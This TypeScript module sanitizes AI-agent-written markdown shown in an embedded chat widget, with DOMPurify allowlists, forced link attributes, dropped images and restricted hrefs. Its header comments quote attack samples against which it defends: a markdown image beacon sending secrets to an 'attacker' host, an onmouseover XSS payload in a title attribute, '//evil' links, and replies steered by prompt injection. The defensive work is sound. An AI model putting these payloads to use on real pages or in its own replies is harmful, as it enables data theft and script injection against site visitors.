// markdown.ts — Severable markdown core extracted from paw-enterprise's
// src/lib/components/chat/MarkdownRenderer.svelte (segment parser + renderMarkdown).
// Created 2026-07-15 (A3 glass bar). This sanitizes AGENT-AUTHORED markdown on a
// PUBLIC origin, so the DOMPurify allowlist below was copied VERBATIM from the
// source component; since 2026-09-26 it deliberately diverges (see below) —
// any unreviewed change is an XSS hole, so tests/markdown.spec.ts pins both
// arrays and they can't silently change.
//
// CUT from the source (concierge v1 is markdown-only, zero Ripple): the
// ui-spec / Ripple branch, @mention pills, mermaid, and syntax highlighting —
// code fences render as plain <pre> + a copy button (see CodeBlock.svelte).
// KEPT: gfm+breaks marked config, the sanitize allowlist (tightened 2026-09-26), the mobile
// table-wrapper, and the streaming unclosed-GENERIC-fence shimmer mask
// (findUnclosedFenceStart) so an in-flight ```code block doesn't leak raw
// backticks mid-stream. The ui-spec-specific JSON-brace mask is not ported —
// there are no ui-spec fences without Ripple.
//
// 2026-07-15 (C2 action loop): parseSegments now intercepts a ```pawbar-card
// fence (CARD_FENCE_LANG) BEFORE markdown render, emitting a `card` segment
// carrying the raw JSON. The card layer (lib/cards.ts + the card components)
// validates + renders it via Svelte props only — the DOMPurify path is
// untouched. A mid-stream unclosed card fence is shimmer-masked like any other.
//
// 2026-09-26 (reply links + model images): the allowlist is NO LONGER a
// verbatim copy of paw-enterprise's. That renderer runs on our own origin; this
// one runs in a cross-origin iframe on a customer's page, reading model output
// a prompt injection can steer. Four changes:
//   • Every surviving <a> is forced to target="_blank" rel="noopener noreferrer"
//     by an afterSanitizeAttributes hook, whatever the model wrote. `target`
//     used to pass through with any value, so `target="_top"` navigated the
//     customer's whole page away; and a plain [x](url) link, having no target,
//     loaded inside the 520px widget frame.
//   • Only http:, https:, mailto: and tel: hrefs survive; anything else
//     (protocol-relative, ftp:, data:, javascript:) loses its href and renders
//     as inert text. (Relative hrefs: see the follow-up paragraph below.)
//   • `img` is gone. A model-written image is a request fired on render, which
//     makes ![](https://attacker/p?d=secret) an exfiltration beacon. Markdown
//     images render as their escaped ALT TEXT (least surprising: the sentence
//     still reads, and [![Logo](img)](url) degrades to an ordinary link). Raw
//     <img> HTML is simply dropped by the tag allowlist.
//   • Attributes are an explicit ALLOWED_ATTR list instead of DOMPurify's
//     defaults + ADD_ATTR. The defaults include style (background:url(...)),
//     src (<input type=image src>) and background (<td background>) — each a
//     beacon by another name.
// The hook lives on a PRIVATE DOMPurify instance so it cannot leak into any
// other sanitize call; the image renderer lives on a private Marked instance
// so the global `marked` is untouched. Product-card image_url (lib/cards.ts)
// is a separate, Svelte-bound path and is not affected.
//
// 2026-09-26 (follow-up): site-relative hrefs (`/returns`, `returns`) are the
// common grounded citation, so they no longer become dead text. main.ts calls
// setLinkBase(config.parentOrigin) at boot; a relative href resolves against
// that origin and is kept only if it stays on it (so `//evil`, `/\evil` still
// drop). With no valid origin (missing, '*', has a path, non-http) relative
// hrefs are dropped as before. And `input` now survives only as a disabled
// type=checkbox (GFM task list); every other input type is removed.
//
// 2026-09-26 (security review, C1): tables were wrapped for mobile scroll by a
// regex over the SANITIZED string. The serializer leaves `<` unescaped inside
// attribute values, so a title like `"<table onmouseover=alert(1) x="` got the
// wrapper's `class="…"` spliced into it, breaking the attribute open, and
// {@html} re-parsed a live <table onmouseover>. Sanitize now returns a DOM
// fragment; tables are wrapped as nodes and the result serialized once, with
// no string post-processing. `title` is dropped from the allowlist, data-* and
// aria-* are off (MARKDOWN_PURIFY_FLAGS), bare `#frag` / `?query` / empty
// hrefs are dropped rather than resolved to the host's home page, and
// setLinkBase normalises an equivalent origin (`https://x:443`, trailing `/`).

import { Marked } from 'marked';
import DOMPurify from 'dompurify';

// ── DOMPurify allowlist — this app's own, pinned by tests/markdown.spec.ts ───
// Do NOT edit without updating that pin. These are the ONLY tags/attributes
// that survive sanitization of agent markdown.
export const MARKDOWN_ALLOWED_TAGS = [
  'p', 'br', 'strong', 'em', 'del', 'a', 'ul', 'ol', 'li',
  'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'blockquote',
  'table', 'thead', 'tbody', 'tr', 'th', 'td',
  'code', 'pre', 'hr', 'sup', 'sub', 'span', 'div',
  'input', // GFM task-list checkboxes
] as const;

// Exactly what marked emits on this path (fences are intercepted upstream):
// href on links (title dropped 2026-09-26: a tooltip adds nothing here and it
// was the attribute the C1 payload rode in), align on table cells, start on <ol>, type/disabled/
// checked on task-list checkboxes. colspan/rowspan/scope keep merged-cell
// tables intact. target/rel are deliberately absent — the link hook is their
// only writer.
export const MARKDOWN_ALLOWED_ATTR = [
  'href', 'align', 'start', 'type', 'disabled', 'checked', 'colspan', 'rowspan', 'scope',
] as const;

// data-* and aria-* are allowed by DOMPurify's defaults even under an explicit
// ALLOWED_ATTR. Nothing marked emits here needs either, and aria-label /
// aria-hidden let a reply say one thing to a screen reader and show another.
export const MARKDOWN_PURIFY_FLAGS = { ALLOW_DATA_ATTR: false, ALLOW_ARIA_ATTR: false } as const;

const SAFE_LINK_PROTOCOLS = new Set(['http:', 'https:', 'mailto:', 'tel:']);

// Host page origin that site-relative hrefs resolve against. Set once at boot
// (main.ts → setLinkBase(config.parentOrigin)); null means "unknown", and then
// relative hrefs are dropped as before.
let linkBase: string | null = null;

/** Accept only an exact http(s) ORIGIN (no path, no '*'); anything else clears
 *  the base so relative links fall back to being dropped. */
export function setLinkBase(origin: string | null | undefined): void {
  linkBase = null;
  if (!origin) return;
  try {
    // Normalise (so `https://shop.example:443` and a trailing `/` are fine),
    // but refuse anything carrying a path, query, hash or credentials: that is
    // not an origin, and guessing which part was meant is worse than dropping.
    const u = new URL(origin);
    const bare =
      u.pathname === '/' && !u.search && !u.hash && !u.username && !u.password && !/[?#]/.test(origin);
    if ((u.protocol === 'https:' || u.protocol === 'http:') && bare) linkBase = u.origin;
  } catch {
    /* not a URL — leave the base unset */
  }
}

/** Return the href to keep, or null to drop it. Absolute hrefs must use an
 *  allowlisted scheme. A relative href is resolved against linkBase and kept
 *  only if it lands on that SAME origin — which is what rejects
 *  protocol-relative `//evil`, and the `/\evil` / `\\evil` spellings browsers
 *  also read as protocol-relative, without having to enumerate them. */
function safeHref(href: string): string | null {
  let absolute: URL | null = null;
  try {
    absolute = new URL(href);
  } catch {
    /* relative — handled below */
  }
  if (absolute) return SAFE_LINK_PROTOCOLS.has(absolute.protocol) ? href : null;
  if (!linkBase) return null;
  // A bare fragment/query (`#faq`, `?q=1`) or empty href refers to the WIDGET's
  // own document; resolving it would silently point at the host's home page.
  // The URL parser strips leading C0 controls/spaces, so this regex does too.
  if (/^[\x00-\x20]*(?:[#?]|$)/.test(href)) return null;
  try {
    const resolved = new URL(href, linkBase + '/');
    return resolved.origin === linkBase ? resolved.href : null;
  } catch {
    return null;
  }
}

function escapeHtml(s: string): string {
  return s
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

// Private marked instance: images render as escaped alt text, never <img>.
const markdown = new Marked({
  async: false,
  gfm: true,
  breaks: true,
  renderer: {
    image({ text }) {
      return escapeHtml(text);
    },
  },
});

let purifier: ReturnType<typeof DOMPurify> | null = null;

// Private DOMPurify instance (created lazily, once a window exists) carrying
// the link hook, so no other sanitize call in the bundle inherits it.
function getPurifier(): ReturnType<typeof DOMPurify> {
  if (purifier) return purifier;
  const p = DOMPurify(window);
  p.addHook('afterSanitizeAttributes', (node) => {
    if (node.nodeName === 'INPUT') {
      // Only the GFM task-list checkbox is legitimate here. Any other input
      // (text, password, submit, ...) is a fake form field a reply could use
      // to phish the visitor, so it goes; the checkbox is forced read-only.
      if ((node.getAttribute('type') ?? '').toLowerCase() !== 'checkbox') node.remove();
      else node.setAttribute('disabled', '');
      return;
    }
    if (node.nodeName !== 'A') return;
    const href = node.getAttribute('href');
    if (href !== null) {
      const kept = safeHref(href);
      if (kept === null) node.removeAttribute('href');
      else if (kept !== href) node.setAttribute('href', kept);
    }
    node.setAttribute('target', '_blank');
    node.setAttribute('rel', 'noopener noreferrer');
  });
  purifier = p;
  return p;
}

export type Segment =
  | { type: 'html'; html: string }
  | { type: 'code'; code: string; lang: string }
  | { type: 'card'; json: string }
  | { type: 'code-loading' };

/** Fence language that carries an agent-authored action card. Intercepted
 *  BEFORE markdown render and parsed as JSON into native glass components
 *  (Svelte props only) — it never touches the DOMPurify/markdown path. */
export const CARD_FENCE_LANG = 'pawbar-card';

export function renderMarkdown(text: string): string {
  // gfm + breaks: turn on GitHub Flavored Markdown extras (tables,
  // strikethrough, autolinks, task lists) and treat single newlines as
  // <br> so multi-line replies look the way users typed them.
  const raw = markdown.parse(text) as string;
  const fragment = getPurifier().sanitize(raw, {
    ...MARKDOWN_PURIFY_FLAGS,
    ALLOWED_ATTR: [...MARKDOWN_ALLOWED_ATTR],
    ALLOWED_TAGS: [...MARKDOWN_ALLOWED_TAGS],
    RETURN_DOM_FRAGMENT: true,
  });
  // Wrap tables in a scrollable container for mobile — in the DOM, NEVER with
  // a string replace on sanitized output (see the security-review note above).
  for (const table of fragment.querySelectorAll('table')) {
    const wrapper = document.createElement('div');
    wrapper.className = 'pawbar-table-wrapper';
    table.replaceWith(wrapper);
    wrapper.append(table);
  }
  const out = document.createElement('div');
  out.append(fragment);
  return out.innerHTML;
}

/** Return the index of the opener of a still-open triple-backtick fence in
 *  ``text``, or -1. Scans line-anchored fence markers in order (inline
 *  backticks in prose don't trigger), toggling open/closed as they pair up.
 *  Only EXTRACTOR-SHAPED openers — ``` plus an optional `[\w#+.-]*` tag,
 *  i.e. what the code-fence regex will extract once the closing fence arrives —
 *  report a hit. Copied verbatim from MarkdownRenderer.svelte. */
function findUnclosedFenceStart(text: string): number {
  const marker = /(?:^|\r?\n)(```[^\n]*)/g;
  let openIdx = -1;
  let openIsExtractable = false;
  let m;
  while ((m = marker.exec(text)) !== null) {
    if (openIdx === -1) {
      openIdx = m.index + m[0].length - m[1].length;
      openIsExtractable = /^```[\w#+.-]*$/.test(m[1].replace(/\r$/, ''));
    } else {
      openIdx = -1;
    }
  }
  return openIdx !== -1 && openIsExtractable ? openIdx : -1;
}

/** Split streamed/finished content into renderable segments: sanitized-HTML
 *  runs interleaved with fenced code blocks. While ``streaming``, an in-flight
 *  unclosed generic fence is masked as a single ``code-loading`` shimmer so raw
 *  backticks never flash in the bubble. Adapted from MarkdownRenderer.svelte's
 *  ``segments`` derivation, with the ui-spec branch removed. */
export function parseSegments(content: string, streaming = false): Segment[] {
  if (!content) return [];

  const result: Segment[] = [];
  // Language class includes `#`, `+`, `.` so ```c++ / ```c# / ```objective-c++
  // and dotted tags extract instead of leaking to marked; `\r?\n` tolerates CRLF.
  const codeBlockRegex = /```([\w#+.-]*)\r?\n([\s\S]*?)```/g;
  let lastIndex = 0;
  let match;

  while ((match = codeBlockRegex.exec(content)) !== null) {
    if (match.index > lastIndex) {
      const html = renderMarkdown(content.slice(lastIndex, match.index));
      if (html.trim()) result.push({ type: 'html', html });
    }
    const lang = match[1] || '';
    // Normalize interior CRLF so copy-to-clipboard never carries `\r`.
    const code = match[2].replace(/\r\n/g, '\n').trimEnd();
    if (lang === CARD_FENCE_LANG) {
      // Intercept before markdown: hand the raw JSON to the card layer, which
      // validates it (cards.parseCard) and renders via Svelte props only.
      result.push({ type: 'card', json: code });
    } else {
      result.push({ type: 'code', lang, code });
    }
    lastIndex = match.index + match[0].length;
  }

  if (lastIndex < content.length) {
    const remaining = content.slice(lastIndex);
    const maskStart = streaming ? findUnclosedFenceStart(remaining) : -1;
    if (maskStart !== -1) {
      const before = remaining.slice(0, maskStart);
      if (before.trim()) {
        const html = renderMarkdown(before);
        if (html.trim()) result.push({ type: 'html', html });
      }
      result.push({ type: 'code-loading' });
    } else {
      const html = renderMarkdown(remaining);
      if (html.trim()) result.push({ type: 'html', html });
    }
  }

  return result;
}
